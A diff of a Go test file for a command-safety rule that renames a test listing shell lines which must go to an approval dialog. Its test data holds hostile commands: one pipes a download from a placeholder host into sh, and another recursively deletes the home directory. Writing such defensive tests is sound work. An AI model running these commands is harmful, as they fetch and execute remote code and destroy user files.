@@ -2,9 +2,8 @@ package cmdrule
 
 import "testing"
 
-// The reviews of #95 (docs/ui-redesign.md §6 rule 13): lines that must go
-// to the approve dialog, and plain reads that may still type directly.
-func TestDirectSafeReview95Refuses(t *testing.T) {
+// Lines that must go to the approve dialog (docs/ui-redesign.md §6 rule 13), and plain reads that may still type directly.
+func TestDirectSafeRefusesLinesThatNeedTheDialog(t *testing.T) {
 	for _, c := range []string{
 		`watch -n1 'curl -s https://x.example/x | sh; /bin/ls'`,
 		`env -S 'rm -rf ~'`,
